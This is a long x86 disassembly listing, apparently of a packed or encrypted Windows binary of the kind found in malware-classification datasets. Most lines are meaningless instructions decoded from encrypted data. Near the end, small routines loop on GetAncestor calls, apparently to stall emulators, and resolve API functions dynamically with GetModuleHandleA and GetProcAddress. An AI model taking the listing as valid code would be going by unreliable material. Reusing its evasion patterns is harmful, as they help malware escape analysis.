arpl [ ebx + ebp * 2 ] ax
add al 0xb0
add [ edx + 0x3f ] edx
pop ss
pop ss
js r-xdata
lodsd [ esi ]
sbb al 0xbb
pop ss
mov ebp 0x46d65f8
adc al 0x65
and edi esp
insb
or ebx [ 0x26001717 ]
aas
pop ss
pop ss
insd
sub [ ecx ] al
js r-xdata
mov eax 0x172fd501
pop ss
js r-xdata
stosb [ edi ]
add [ eax ] edx
out dx eax
call 0x61d494a5
clc
mov gs [ ebp + 0x3a ]
out 0x6c eax
bound esp [ ebx ]
pop ss
pop ss
add [ ebp + 0x5b ] ebp
pop ss
pop ss
sub ah 0x80
call 0x182f04ac
sahf
mov eax 0x687f17bb
call 0xffffffff9e5e04c7
mov eax 0xbb1cad61
lodsd [ gs : esi ]
dec esp
add esp edx
pop ss
pop ss
movsd [ edi ] gs : [ esi ]
pop esp
sub al 0x17
add esi edx
js r-xdata
pop ss
js r-xdata
js r-xdata
in al dx
js r-xdata
js r-xdata
js r-xdata
pop ss
js r-xdata
mov eax 0xe8e9ec80
call 0xffffffffe896969a
call 0x16e8670
push esp
das
pop ss
pop ss
js r-xdata
insb
loop r-xdata
jmp 0x60138b7d
js r-xdata
js r-xdata
push ebx
js r-xdata
inc eax
das
lodsd [ esi ]
add [ ebx + 0x2fa3a5be ] ah
lodsd [ gs : esi ]
mov ebp 0x175af501
arpl [ ebp + 0x14ad61e0 ] bp
add [ ebp + edx * 2 + 0x17 ] ebp
js r-xdata
js r-xdata
mov fs [ ecx - 0x6b ]
push ds
add [ ebx ] edx
push ds
pop ss
pop ss
or [ edx - 0x529e7150 ] 0x10
sbb [ ebx - 0x529e7150 ] 0x12
fld [ eax ]
mov fs [ ecx - 0x53 ]
js r-xdata
and al 0xe
js r-xdata
js r-xdata
call 0xffffffff94b3800a
js r-xdata
scasb [ edi ]
out dx al
out 0x6b eax
loop r-xdata
call 0xffffffff832f1214
jmp r-xdata
pop ss
mov al 0x8e
popad
lodsd [ esi ]
adc al 0xdb
sub [ esi + 0x116ad61 ] cl
mov esi esp
call 0x78be9205
out 0x7 eax
pop ss
out 0x5f eax
scasb [ edi ]
out dx al
pop ss
lodsd [ esi ]
sbb al 0x1
add eax 0x78171718
js r-xdata
call 0xffffffffc8dd8979
int 0x5f
pop ss
pop ss
imul edx [ edi + 0x6de7e9f4 ] 0x1e
jmp r-xdata
insd
js r-xdata
js r-xdata
out 0x6c eax
js r-xdata
pop ss
js r-xdata
mov edi 0xc8ae61
mov [ esi ] edi
movsd [ edi ] [ esi ]
mov [ 0x31de01be ] eax
pop ss
pop ss
js r-xdata
movsd [ edi ] [ esi ]
mov [ 0xffffffffbe04ad2f ] eax
js r-xdata
js r-xdata
mov bh 0xb6
add [ 0xffffffff80e8e8e0 ] ecx
cmp bh ch
js r-xdata
sub al 0xf0
insd
sub bh ah
insb
pop ss
add eax 0x17821717
mov eax 0xb401ea82
sub edx [ edi ]
pop ss
pop ss
js r-xdata
push ebp
pop ss
nop
0xc5201e8 0x1717
js r-xdata
add [ edi ] ecx
js r-xdata
insd
sub edi [ eax + 0x78 ]
pop ss
pop ss
js r-xdata
call 0x174ac0b4
pop ss
js r-xdata
push ss
add [ ecx + 0x78e8e8e6 ] ecx
js r-xdata
js r-xdata
jge r-xdata
js r-xdata
call 0xffffffffe10434ca
insd
push esp
adc dl [ edi ]
pop ss
mov eax 0x1c4be17
0x1707
out dx eax
push edi
or ah [ eax ]
pop ss
pop ss
insd
sub bh ah
insb
sub bl [ 0x4d011717 ]
sbb eax 0x2bb61717
adc eax 0x17173f
mov eax [ 0xffffffffb8be63d4 ]
add [ edi + 0x1c ] ebx
aas
sbb al 0x17
pop ss
add [ esi + 0x6317170c ] ah
movsd [ edi ] [ esi ]
loopne r-xdata
js r-xdata
lodsd [ esi ]
add al 0xbe
das
pop ss
js r-xdata
mov dl 0x82
or [ esi - 0x4dff429f ] 0x618e9a82
mov ebp 0x5d0e0102
pop ss
pop ss
js r-xdata
pop ss
js r-xdata
add ebp esi
pop edx
pop ss
js r-xdata
sub al 0xe8
js r-xdata
pop ss
mov fs [ ecx - 0x4b ]
inc eax
mov bl 0x8e
popad
mov ch 0x42
add ebp edi
pop ds
pop ss
pop ss
pop ss
popfd
add [ edi ] dl
jg r-xdata
pop ss
mov eax 0x172a6401
out 0x6d eax
cmc
or edx [ edi ]
pop ss
add [ edi ] ebp
push edi
pop ss
pop ss
add [ eax ] 0xeb
call 0x747da7
jpe r-xdata
out 0xe8 al
call 0x78be9196
lodsd [ esi ]
adc al 0x1
pop ss
js r-xdata
mov eax 0x168ad65
add [ cs : edx + 0x7817171a ] esp
mov ss bx
imul edx [ ebx ] 0xffffffe1
add [ ecx + 0x7817171b ] edi
mov eax 0xe8e98d01
call 0xffffffff8e7481a9
popad
lodsd [ esi ]
arpl [ ecx ] dx
out 0x6c eax
std
call 0xffffffff94b2066d
popad
lodsd [ esi ]
sbb al 0xd3
das
add [ edi + ebp + 0x78781717 ] ebx
js r-xdata
js r-xdata
pop [ ecx ]
movaps [ edi ] xmm2
js r-xdata
arpl [ eax ] sp
mov fs [ ecx - 0x53 ]
adc bl bl
sub [ edx - 0x529e7170 ] al
adc al 0x1
das
insd
mov bh [ edx ]
pop ss
pop ss
add [ edx + 0x1717172d ] ebp
popfd
sbb al 0x1
mov eax 0x78171703
js r-xdata
das
pop ss
pop ss
cmp [ edi - 0x5 ] 0xc9
push esi
mov edi 0xe0ae61
mov ebx 0x8017173e
adc [ edi + edx * 8 ] ah
mov eax [ 0xffffffffecae61bf ]
add [ ebp + 0x117173e ] ch
popad
scasb [ edi ]
enter 0x8900 0x3e
js r-xdata
add al 0xb0
add [ ecx + 0x17097e01 ] 0x17
js r-xdata
mov fs [ ecx - 0x53 ]
pop ss
js r-xdata
clc
call 0xffffffffe0c704b1
and [ ecx - 0x35 ] 0x17
pop edi
sub al 0xe8
call 0x2ac11a23
pop ss
pop ss
add ebp esp
jmp r-xdata
pop ss
js r-xdata
js r-xdata
pop ss
pop ss
arpl [ eax ] si
imul ebp [ esp ] 0x6d
pop ss
pop ss
add eax edx
or edx [ edi ]
pop ss
add [ esp + edi ] dl
js r-xdata
js r-xdata
js r-xdata
lodsd [ esi ]
in al 0xe7
insb
push 0x25
pop ss
js r-xdata
lodsd [ esi ]
adc [ edi ] dl
mov edi 0x1286dbc
std
xor [ edi ] edx
pop ss
js r-xdata
cmp [ eax ] 0xe9
jmp 0xffffffffbb79faca
popad
mov ch 0xc
or [ edi + 0x17290f01 ] 0x17
pop ss
add [ 0xffffffffbe7e8b13 ] 0x1
add edx [ edi ]
pop ss
js r-xdata
js r-xdata
call 0xffffffffccda896e
cld
jmp 0xffffffffe9288a73
js r-xdata
sub ah 0xe9
js r-xdata
js r-xdata
js r-xdata
adc al 0x3c
js r-xdata
pop ss
js r-xdata
js r-xdata
arpl [ esi ] bp
add [ edi + 0xe ] cl
js r-xdata
push 0x61e8e8e8
outsb
sub al ch
call 0xffffffffe771f2d9
popad
lodsd [ esi ]
push es
mov al 0x82
lea esi [ ebx + 0x18ad618e ]
sbb [ edx + 0x12b63 ] 0xea
call 0x78be9855
js r-xdata
js r-xdata
pop ss
pop ss
or al 0x17
pop ss
arpl [ ebp - 0x2b5e9c20 ] sp
arpl [ esi + 0x1c5f01b8 ] di
and [ gs : 0xfffffffff0001717 ] dl
sub [ edi ] dl
insd
and [ 0x17b81717 ] dl
mov esi 0x6b21db8c
adc [ edi ] dl
out 0x7d eax
sub [ ebx + 0x11 ] esp
enter 0xe7e9 0x6d
imul edx [ esp + ecx * 8 + 0x6ce7e9fc ] 0xffffffe2
call 0xffffffff97b20678
js r-xdata
jmp 0x6dac0309
js r-xdata
adc [ ecx ] al
js r-xdata
js r-xdata
insb
popad
lodsd [ esi ]
adc al 0x1
imul edx [ esp + ecx * 8 + 0x6ae7fcf8 ] 0xffffff86
das
js r-xdata
js r-xdata
pop ss
pop ss
lodsd [ esi ]
insd
pop ss
js r-xdata
js r-xdata
call 0x28b480d3
call 0x2c1a07d8
out 0x6d eax
js r-xdata
int3
add [ edi + 0x7817171a ] edi
arpl [ edi ] bp
call 0x15da8788
pop ss
and [ ebx ] ebp
js r-xdata
0x1716
insd
js r-xdata
pop ss
call 0x1fe0782
jo r-xdata
int3
js r-xdata
push esi
js r-xdata
js r-xdata
js r-xdata
pop ss
add [ ebp + 0x38 ] ebp
pop ss
pop ss
js r-xdata
[ edi ] dl
popad
mov ebp 0x618eb28a
mov ebp 0xfac018c
pop ss
pop ss
js r-xdata
adc eax 0x1b81717
sub dl [ fs : edi ]
js r-xdata
jb r-xdata
out 0x6c eax
js r-xdata
insd
sub esp edi
pop ss
pop ss
js r-xdata
pop ss
pop ss
sub al 0x17
jle r-xdata
cld
out 0x6a eax
xchg [ edi ] ch
mov cl 0x82
pushfd
add [ eax ] ebp
add eax 0x28db1717
mov dl 0x38
mov esi 0x17106b8c
js r-xdata
pop ss
js r-xdata
pop ss
pop ss
mov cl 0x6d
sub bh ah
insb
jmp r-xdata
add [ cs : edi + 0xe ] cl
in al 0x8
pop ss
pop ss
retn
out 0x6d eax
pop ss
call 0x5d4747d5
lea ecx [ esi - 0x4fc5529f ]
add [ esi + 0x17028801 ] 0x17
sub edx [ edi ]
sub [ ecx ] al
js r-xdata
cli
sub [ edi ] edx
js r-xdata
out 0x6d eax
imul edx [ eax ] 0x17
js r-xdata
mov ebx 0xae65ec82
js r-xdata
js r-xdata
fld [ eax ]
mov dh 0xb3
and [ ebx ] ebp
js r-xdata
pop ebp
xor [ ebp + 0x17 ] ch
js r-xdata
pop ss
arpl [ eax ] dx
arpl [ esi ] bp
js r-xdata
pop ss
js r-xdata
fdivr [ eax + 0x6310ad63 ]
push 0xe8e8e84c
imul ebp [ eax ] 0xffffffe0
add [ ecx + 0x5c ] esp
pop ss
pop ss
imul edx [ ebp - 0x33fe17ec ] 0x38
pop ss
pop ss
js r-xdata
in al dx
js r-xdata
test al 0x1
js r-xdata
js r-xdata
js r-xdata
pop ss
js r-xdata
add [ eax + 0x78171737 ] ebx
js r-xdata
pop ss
js r-xdata
add ch bh
adc [ ebx + 0x2e ] ah
js r-xdata
test eax 0x8217175b
jmp 0xffffffffc812cde7
insd
js r-xdata
scasb [ edi ]
[ ecx + eax + 0x17173ed0 ] 0x78
call 0x7c480973
pop ss
salc
js r-xdata
aaa
pop ss
sub eax 0x2d011717
sub [ esi + 0x6502ad61 ] cl
js r-xdata
js r-xdata
scasb [ edi ]
js r-xdata
js r-xdata
cwde
aaa
js r-xdata
inc edi
add ch bh
js r-xdata
pop ebx
js r-xdata
or edx [ edi ]
insb
add [ edx - 0x15 ] ebp
js r-xdata
pop ss
pop ss
js r-xdata
sub edi [ eax + 0x78 ]
js r-xdata
sub esp edi
insb
neg [ edi + edx ]
pop ss
arpl [ eax ] sp
add [ edx + eax ] edi
push esp
adc dl [ edi ]
pop ss
popad
lodsd [ esi ]
js r-xdata
pop ss
js r-xdata
arpl [ ebp - 0x44169e1c ] sp
add [ ebp - 0x14e8e8f8 ] edx
lodsd [ esi ]
loopne r-xdata
js r-xdata
pop ss
add dl [ edi ]
js r-xdata
pop ss
pop ss
js r-xdata
js r-xdata
std
js r-xdata
pop ss
sub cl 0x65
lodsb [ esi ]
int3
call 0xffffffffc6c89a00
mov fs [ ecx - 0x53 ]
sbb [ ebx + 0xaad618e ] 0xb0
or dl 0x8e
popad
cmp bl bl
js r-xdata
js r-xdata
jmp r-xdata
js r-xdata
mov eax 0x171caf00
pop ss
imul ebp [ esp ] 0x17
sub [ eax + 0x170cd601 ] ch
js r-xdata
add ah [ ebp + 0x6d ]
js r-xdata
aaa
pop ss
pop ss
js r-xdata
mov dl 0x37
adc ah 0xe2
js r-xdata
js r-xdata
pop ss
pop ss
js r-xdata
popad
mov ebp 0x18c82da
int3
pop ss
pop ss
js r-xdata
and ah 0x47
js r-xdata
xor esp [ ebp - 0x53 ]
cmp al 0x8e
popad
popfd
arpl [ es : ebp - 0x4a9e7120 ] bx
push eax
arpl [ edx ] si
mov eax 0x618e2e63
mov ch 0x54
mov fs [ ecx - 0x43 ]
sub [ ecx ] al
pop edx
cmp edx [ edi ]
pop ss
js r-xdata
js r-xdata
out 0x5f eax
scasb [ edi ]
cld
lodsb [ gs : esi ]
fdiv st0
sub [ ecx + eax + 0x17173ed0 ] 0x78
push 0xe7e8ec97
outsb
js r-xdata
js r-xdata
adc al [ ecx ]
add [ edi ] ebx
pop ss
pop ss
js r-xdata
call 0xffffffff8f0ca391
popad
lodsd [ esi ]
js r-xdata
or al 0x17
add esi edx
js r-xdata
insd
add al bl
sbb eax 0x9011717
in eax dx
call 0xffffffff86c89887
arpl [ eax ] sp
mov fs [ ecx - 0x5b ]
add [ ecx ] al
shr [ edx ] cl
pop ss
pop ss
js r-xdata
js r-xdata
js r-xdata
mov [ edx ] al
pop ss
pop ss
adc al 0x63
lodsd [ esi ]
adc al 0xd3
lodsd [ esi ]
adc bh ah
push 0x26
sub eax 0x2d011717
arpl [ ecx + eax ] ax
or bl ch
call 0x298a20b1
pop ss
pop ss
shr [ ebp + 0x6a6ce7e4 ] cl
and eax 0xad171717

arpl [ esi - 0x1d2b7f24 ] bp
js r-xdata
imul edx [ eax ] 0xffffffe9
out 0x6d eax
adc eax 0x117172a
sbb [ edx ] ebp
pop ss
pop ss
js r-xdata
js r-xdata
sub ebx [ ecx - 0x41 ]
inc edi
js r-xdata
sub [ ecx ] al
stc
popad
movsd [ edi ] [ esi ]
js r-xdata
add al 0x69
add al 0x8c
loop r-xdata
js r-xdata
mov eax 0x1708d101
pop ss
sub [ eax + 0x17092601 ] 0x17
add eax ecx
adc al 0x17
pop ss
js r-xdata
js r-xdata
fadd [ eax - 0x4f341d2c ]
add [ esi + 0x78171710 ] ebx
js r-xdata
js r-xdata
arpl [ ebx ] bp
add [ eax + 0x78171714 ] esp
js r-xdata
arpl [ esi ] bp
mov fs [ ecx - 0x53 ]
imul eax
out 0xe8 eax
add [ 0x17173f ] edx
pop ecx
mov edi 0x1f4ae61
loopne r-xdata
js r-xdata
js r-xdata
pop ss
pop ss
arpl [ eax ] dx
add [ edi + 0x78171700 ] edx
call 0x177e78aa
pop ss
js r-xdata
js r-xdata
push esi
js r-xdata
aam 0xe2
mov ebp 0x8010463
jmp r-xdata
mov dl 0x82
lahf
mov fs [ ecx - 0x43 ]
and al 0xb2
sbb [ edx + 0x172f6401 ] 0x17
js r-xdata
pop ss
pop ss
js r-xdata
popad
scasb [ edi ]
js r-xdata
pop ss
js r-xdata
js r-xdata
js r-xdata
jg r-xdata
add [ edi + 0x6b17171c ] ch
sub al 0xe4
pop ss
fld [ eax ]
mov fs [ ecx - 0x53 ]
pop ss
js r-xdata
insd
dec ebx
add [ 0x7817172c ] edx
js r-xdata
mov fs [ ecx - 0x53 ]
and [ edi ] dl
pop ss
js r-xdata
fldenv [ eax ]
pop ss
hlt
js r-xdata
lodsd [ esi ]
or al 0x1
push 0xffffffeb
fwait
mov fs [ ecx - 0x53 ]
or dh [ eax + 0x618eca82 ]
xchg edi eax
in al dx
call 0x5c44908c
pop ss
pop ss
imul ecx [ esp + ecx * 8 - 0x539a1734 ] 0xffffffcc
int3
and [ ebx + 0x20 ] ah
fld [ eax ]
mov fs [ ecx - 0x4b ]
pop esi
mov fs [ ecx - 0x53 ]
mov fs [ ecx - 0x5b ]
push cs
fistp [ esi ]
mov esi 0x6da4bf17
sub ah 0x65
js r-xdata
clc
fld [ eax ]
add [ ebx - 0x14 ] edi
call 0x78be9b10
out 0x6d eax
stosb [ edi ]
sub edx [ edi ]
pop ss
fld [ eax ]
add [ ebx + 0x36 ] esi
pop ss
pop ss
out 0x6c eax
pushfd
xor edx [ edi ]
clc
lodsb [ gs : esi ]
int3
add [ ebp + 0x7817175d ] eax
js r-xdata
insd
js r-xdata
mov edi 0xf0ae61
push cs
cmp [ edi ] edx
pop ss
insb
int3
scasb [ edi ]
js r-xdata
out 0x6d eax
mov fs [ ecx - 0x53 ]
sbb dh [ eax + 0x1b69b82 ]
fdivr [ esi ]
pop ss
pop ss
js r-xdata
js r-xdata
adc ebp [ ebx + 0x2e ]
loopne r-xdata
mov ebp 0x6517172a
xchg ebp eax
out 0x6d eax
js r-xdata
pop ss
pop ss
js r-xdata
pop ss
add [ edx ] eax
adc eax 0x2f781717
lodsd [ esi ]
adc dl cl
enter 0xcdca 0x1
mov ebx 0x7817172e
js r-xdata
pop ss
sub bh ah
insd
call 0xd8c252c
js r-xdata
pop ss
mov bh 0xb6
insd
sub [ ecx ] al
inc ebp
xor dl [ edi ]
pop ss
add [ edi - 0x24 ] 0xb8
jpo r-xdata
pop ss
pushad
mov ah 0xfd
js r-xdata
popad
push esi
cmp al 0xe8
call 0x390b2471
pop ss
pop ss
sbb [ ebx ] 0x9c
lea edi [ ebx - 0x4f519e41 ]
add bh dh
cmp [ edi ] dl
pop ss
add [ edi ] edi
sub eax 0x78781717
js r-xdata
imul ebp [ eax + edi * 8 ] 0x1
lodsb [ esi ]
adc al 0x17
pop ss
test al 0xb8
js r-xdata
pop ss
pop ss
js r-xdata
pop ss
add [ esi + 0xd ] eax
js r-xdata
and [ ebp + 0x65 ] ah
pop eax
adc eax 0x1a001717
push eax
pop ss
pop ss
insd
sub [ ecx ] al
shr [ edx ] cl
pop ss
pop ss
pop ss
xchg ebp eax
mov cl 0x6d
sub [ ecx ] al
out 0x8 al
pop ss
pop ss
out 0x6c eax
or eax 0xe7171717
pop edi
stc
mov ebx 0xe8ea0301
call 0x23038397
in al 0xbb
js r-xdata
js r-xdata
lodsd [ esi ]
loopne r-xdata
sub [ edx ] 0x78781717
js r-xdata
js r-xdata
js r-xdata
pop ss
pop ss
insb
int3
nop
sbb [ edi ] edx
insd
js r-xdata
movsd [ edi ] [ esi ]
in al 0x1
inc eax
inc esi
pop ss
pop ss
mov ebx 0xb401f282
add eax 0x286d1717
add [ ecx + 0x7817172a ] eax
sub dl 0x17
js r-xdata
js r-xdata
js r-xdata
pop ss
imul ebp [ ecx ] 0xffffffea
imul ebp [ edx ] 0xffffffea
add eax esp
cmp [ edi ] edx
pop ss
js r-xdata
sub dl [ edi ]
popad
movsd [ edi ] [ esi ]
or al [ eax ]
hlt
mov eax [ 0x6d17171b ]
mov fs [ ebx - 0x55 ]
pop ss
pop ss
pop ss
mov eax 0xc6ab638e
mov esi 0x13063e4
adc [ ebx + 0x17 ] edx
pop ss
js r-xdata
pop ss
imul eax [ esp + eax * 2 ] 0xbee8e8ec
add edx ebp
das
pop ss
pop ss
mov fs [ ecx - 0x43 ]
jo r-xdata
js r-xdata
js r-xdata
js r-xdata
js r-xdata
mov ebx 0x447e17af
call 0x2faa0dae
mov bh 0xb6
mov bl 0x6b
sub eax 0x782b219c
js r-xdata
fist [ edi ]
js r-xdata
sbb al [ edi ]
pop ss
pop ss
cmp al 0x65
pop ss
js r-xdata
popad
xchg ebp eax
jl r-xdata
out 0x5e eax
js r-xdata
mov esi 0xf4002f63
js r-xdata
pop ss
js r-xdata
mov ebp 0x173d9f01
pop ss
js r-xdata
pop ss
pop ss
mov eax 0xc8011f63
push esp
pop ss
pop ss
js r-xdata
add al 0x15
adc [ eax + 0x17058401 ] 0x17
js r-xdata
sub esp [ ecx - 0x53 ]
adc al 0xb8
pop ss
popfd
cld
arpl [ ebp + 0x192901e0 ] bp
pop ss
pop ss
js r-xdata
adc al bl
js r-xdata
js r-xdata
js r-xdata
aas
das
add ah dh
js r-xdata
adc dl [ edi ]
push ecx
fsubr st0
call 0xffffffffe9a9b24c
js r-xdata
lodsd [ esi ]
adc al 0x1
call 0x6d5e885e
js r-xdata
int3
add al 0xb9
mov ebx 0x199201be
pop ss
pop ss
js r-xdata
das
add [ ecx ] edi
push es
js r-xdata
call 0xffffffffaa470e73
js r-xdata
js r-xdata
hlt
js r-xdata
js r-xdata
js r-xdata
js r-xdata
pushad
loopne r-xdata
push ds
arpl [ eax ] bx
sub [ ecx ] al
cmp eax [ ecx ]
pop ss
pop ss
js r-xdata
add [ ecx + 0x6d17171b ] ah
sub al 0x17
js r-xdata
pop ss
pop ss
js r-xdata
cmp [ esi ] eax
insd
add [ edi + edx ] dl
pop ss
mov eax 0x15046d65
arpl [ eax ] dx
add [ ecx + 0x6b171738 ] dh
sub al 0xf8
add [ esp + edx - 0x4757e8e9 ] ebp
imul ebp [ eax + edx * 8 ] 0x65
js r-xdata
pop ss
mov eax 0x11cad65
call 0x17a4cf8d
js r-xdata
mov gs bx
lodsb [ esi ]
or al 0x8e
popad
lodsd [ esi ]
push cs
add [ ebx ] esi
sub eax 0xac631717
int3
pop ss
pop ss
mov cl 0xb1
add ebx esp
sbb al 0x17
pop ss
js r-xdata
mov ebx 0x184700b8
pop ss
pop ss
imul ebp [ esp ] 0xffffffbb
int 0x59
js r-xdata
arpl [ ebx ] dx
mov fs [ ecx - 0x6b ]
sub [ ebx + 0x11 ] ah
mov fs [ ecx - 0x6b ]
sub al [ ecx ]
stosb [ edi ]
pop esi
pop ss
pop ss
js r-xdata
js r-xdata
arpl ax bp
arpl [ eax - 0x33139e10 ] bp
arpl sp bp
int3
test al 0xe4
lodsd [ esi ]
adc al 0x1
jb r-xdata
lodsd [ esi ]
pop eax
add [ ecx ] esi
or al 0x17
pop ss
js r-xdata
insd
call 0x18aa0d5d
jle r-xdata
pop ss
js r-xdata
pop es
pop ss
pop ss
fld [ eax ]
stc
out 0x5e eax
in al dx
out 0x1 al
sub esp [ edi ]
pop ss
pop ss
add [ esi + 0x6517175c ] ah
mov ebp 0x38f80034
pop ss
cmp [ eax - 0x4793529b ] bh
shl [ ebp - 0x53 ] 0x1
js r-xdata
pop esi
stosb [ edi ]
out 0x6c eax
pop ss
sub cl [ esi - 0x4f09529f ]
add dh 0xb6
or [ ebp - 0x37529e72 ] 0x1
stosb [ edi ]
pop ecx
mov esi 0x1c882be
sub [ edi ] edx
add eax ecx
or edx [ edi ]
pop ss
add [ edi + 0x6d171725 ] al
sub bh ah
insb
jl r-xdata
and [ ebx ] ebp
js r-xdata
pop ss
movsd [ edi ] gs : [ esi ]
js r-xdata
add [ eax + edx * 2 + 0x27c31717 ] eax
mov ss bx
sbb esp edi
insd
cmp ebx [ edx ]
pop ss
pop ss
add [ esi ] ecx
xor al 0x17
pop ss
js r-xdata
sbb [ ecx ] 0xf5
sub [ eax - 0x17d3a0e9 ] 0xaa00e8e8
js r-xdata
pop ss
pop ss
out 0x6c eax
leave
das
pop ss
pop ss
arpl [ ebp - 0x440f9e08 ] bp
push 0x63e8e8e8
sbb [ ebp + 0x1e ] ch
js r-xdata
js r-xdata
adc [ eax + 0x1ea5618e ] 0x63
and [ esi - 0x4eef5a9f ] cl
mov fs [ ecx - 0x5b ]
js r-xdata
lodsd [ esi ]
js r-xdata
js r-xdata
js r-xdata
js r-xdata
add [ ebp + edi + 0x78781717 ] ebx
js r-xdata
call 0x1768cb85
js r-xdata
inc eax
add [ ebp + 0x286d1717 ] dh
out 0x6c eax
imul eax [ edi ] 0x28db1717
pop ss
push eax
movsd [ edi ] [ esi ]
js r-xdata
popad
lodsd [ esi ]
lodsd [ esi ]
loopne r-xdata
pop ss
call 0x5ef02674
js r-xdata
js r-xdata
js r-xdata
js r-xdata
pop ss
pop ss
mov ss [ eax - 0x17 ]
call 0x179e36ef
pop ss
js r-xdata
mov fs [ ecx - 0x5b ]
push ds
arpl [ eax ] sp
mov fs [ ecx - 0x5b ]
adc [ ecx + 0x12a5618e ] dh
add ebp ecx
pop ecx
mov ebx 0xe8447e17
call 0x5446284c
pop ss
pop ss
js r-xdata
mov eax 0xb86cad65
js r-xdata
pop ss
add [ edx ] ebx
push ds
pop ss
pop ss
js r-xdata
insb
js r-xdata
js r-xdata
stc
js r-xdata
add [ eax - 0x746f6fad ] dl
rol [ ebp - 0x46ef892e ] 0x1
add [ eax ] eax
js r-xdata
add [ ebx + 0x6a ] dl
add [ edx ] ch
js r-xdata
pop ss
movsb [ edi ] [ esi ]
and dl [ edi ]
js r-xdata
lodsd [ gs : esi ]
js r-xdata
pop ss
lodsd [ gs : esi ]
pop ss
mov eax 0xe817ad2e
add [ ecx + 0x31 ] al
pop ss
pop ss
add [ edi + 0x78171740 ] ebp
js r-xdata
add al bh
js r-xdata
daa
pop ss
xor esp [ edi ]
cmc
add [ edi ] dl
pop ss
js r-xdata
add [ edx - 0x47e8e8a2 ] ch
lodsd [ gs : esi ]
sbb al 0x1
js r-xdata
add [ eax ] al
pop ebp
cmp [ 0xffffffffbf171717 ] dl
js r-xdata
js r-xdata
adc al [ ecx ]
lodsd [ esi ]
js r-xdata
xor [ eax + 0x17553a01 ] dh
pop ss
mov bl 0x21
sub edi [ eax + 0x78 ]
js r-xdata
mov ebp 0x4690463
mov eax 0xbfe8e8ea
sbb [ ebx + 0x638982b1 ] 0x29
js r-xdata
jne r-xdata
pop ecx
pop ecx
pop ebp
retn 0x4
mov ebx ecx
xor eax eax
pop ebx
retn
sub al 0xfc
insd
mov edi 0x18b561
inc edi
das
pop ss
pop ss
add [ edx ] edi
pop ss
pop ss
js r-xdata
nop
dec ebx
jne r-xdata
mov eax 0x1ebc3a75
call GetAncestor
mov ebx 0x946aa26
push 0x0
push 0x0
pop ss
js r-xdata
pop ss
jg r-xdata
cmp [ edi ] dl
js r-xdata
arpl [ ebp + 0x782b2114 ] bp
adc esp [ eax ]
pop ss
pop ss
mov ebp 0x39db0034
pop ss
pop ss
add [ 0x7817175b ] eax
js r-xdata
insb
js r-xdata
clc
add [ 0x7817170c ] edx
js r-xdata
adc eax 0xbf171717
js r-xdata
js r-xdata
mov eax 0xc882bebe
add [ esi ] edi
sub [ edi ] edx
js r-xdata
popad
lodsd [ esi ]
adc [ ecx ] al
push cs
pop ecx
pop ss
pop ss
js r-xdata
push 0x0
push 0x0
call GetAncestor
dec ebx
jne r-xdata
mov esp 0x8bd2331e
retn
js r-xdata
js r-xdata
add ebx eax
js r-xdata
mov [ rw-data ] 0xde09
nop
nop
mov ecx 0x1ebc3a75
xor edx edx
mov eax ebx
call sub_4627e0
push 0x0
nop
js r-xdata
js r-xdata
call 0x2cb20efb
test al 0x17
pop edi
sub al 0xe8
pop ss
mov eax 0x17443200
pop ss
add [ esi + edx * 2 + 0x618e1717 ] edx
lodsd [ esi ]
xor al 0xb0
add [ edi + 0x1720d901 ] 0x17
js r-xdata
insd
sub al 0x14
pop ss
pop ss
mov eax 0x12546d65
pop ss
nop
pop ebx
retn
cmp bh [ esi + ebx - 0x6016018 ]
js r-xdata
pop ss
pop ss
js r-xdata
js r-xdata
arpl [ eax - 0x1b579c1c ] bp
arpl cx bp
arpl [ ecx + ebp * 2 ] ax
add al 0xb8
0x82bfe8e8 0xb19b
mov fs [ ecx - 0x53 ]
mov cl 0x82
mov [ ebx + 0x29 ] esp
mov fs [ ecx - 0x4b ]
or [ ecx ] al
test [ eax + 0x17 ] dl
pop ss
retn
push 0x0
call sub_45cdd8
nop
pop ebx
retn
js r-xdata
imul edx [ ecx ] 0xffffffb4
js r-xdata
mov [ ebx ] 0x9a
inc ecx
dec edx
jne r-xdata
js r-xdata
call sub_4026bc
mov ebx eax
test ebx ebx
jne r-xdata
push ds
js r-xdata
cld
js r-xdata
mov edi 0xc1501f8
pop ss
pop ss
js r-xdata
js r-xdata
add cl cl
push es
pop ss
pop ss
mov esi 0x17556d01
pop ss
js r-xdata
js r-xdata
sub al 0xd8
js r-xdata
pop ss
mov ah 0x1
js r-xdata
pop ss
pop ss
js r-xdata
mov fs [ ecx - 0x53 ]
enter 0xaa01 0x59
in al dx
jmp 0xffffffffa448106a
lahf
js r-xdata
jne r-xdata
js r-xdata
sub [ ecx ] al
xchg edi eax
test [ eax + 0x17 ] dl
pop ss
imul ebp [ esp + edi * 8 ] 0x6d
pop es
pop ss
js r-xdata
xor [ eax + 0x17 ] ebx
js r-xdata
xor [ esi + 0x63bcb561 ] cl
xor [ esi + 0x63beb561 ] ecx
xor [ esi - 0x244f4a9f ] cl
xor eax [ ecx ]
int1
js r-xdata
dec [ ebx + 0x75db85d8 ]
add al 0x90
stc
[ eax - 0x78 ]
mov esp 0xfe9fe81e
js r-xdata
pop ss
js r-xdata
js r-xdata
push 0x0
js r-xdata
pop ss
js r-xdata
pop ss
js r-xdata
pop ss
pop ss
js r-xdata
js r-xdata
js r-xdata
call GetAncestor
mov eax ebx
call sub_4026dc
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
mov [ rw-data ] eax
mov ebx 0xb85b
js r-xdata
call 0xffffffffea2ea825
call 0x182eaa2a
cmp esp [ ebx + 0x18 ]
pop ss
add [ ecx ] edx
cmp [ edi ] dl
pop ss
js r-xdata
insb
aas
add [ edi ] dl
js r-xdata
mov gs [ ebx + 0x11 ]
js r-xdata
js r-xdata
cmp al 0xfa
js r-xdata
adc [ ecx + eax + 0x171726f1 ] esi
js r-xdata
js r-xdata
dec [ ebx - 0x174173d ]
js r-xdata
add ecx esi
js r-xdata
add dh 0x8e
popad
lodsd [ esi ]
cli
mov al 0x82
sahf
mov fs [ ecx - 0x53 ]
sbb al 0xb0
mov fs [ ecx - 0x53 ]
push ds
add esi ecx
sbb eax 0x82781717
nop
retn
js r-xdata
js r-xdata
mov edi esi
js r-xdata
add [ ebp + 0x78171722 ] eax
js r-xdata
call 0xffffffff812f1013
call 0xffffffff832f1029
call 0x18a9625c
sub_4627e0
push ebx
nop
nop
mov edx ecx
test edx edx
jbe r-xdata
xor eax eax
pop ebx
retn
mov ecx 0x1
mov ebx ecx
add ebx eax
mov [ ebx ] 0x9a
inc ecx
dec edx
jne r-xdata
sub_462800
push ebx
push 0x0
push 0x0
call GetAncestor
mov ebx 0x946aa26
